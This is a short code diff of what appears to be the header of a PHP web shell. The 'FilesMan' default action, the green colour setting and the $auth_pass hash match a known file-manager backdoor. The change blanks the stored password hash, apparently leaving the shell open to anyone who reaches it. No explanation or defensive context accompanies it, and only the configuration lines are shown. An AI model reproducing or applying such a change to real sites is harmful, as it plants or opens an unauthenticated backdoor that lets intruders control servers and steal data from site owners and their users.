@@ -1,5 +1,5 @@
 <?php
-$auth_pass = "b733c35193457c763343a9a55e3f6822"; //b733c35193457c763343a9a55e3f6822
+$auth_pass = ""; //b733c35193457c763343a9a55e3f6822
 $color = "#00ff00";
 $default_action = 'FilesMan';
 @define('SELF_PATH', __FILE__);
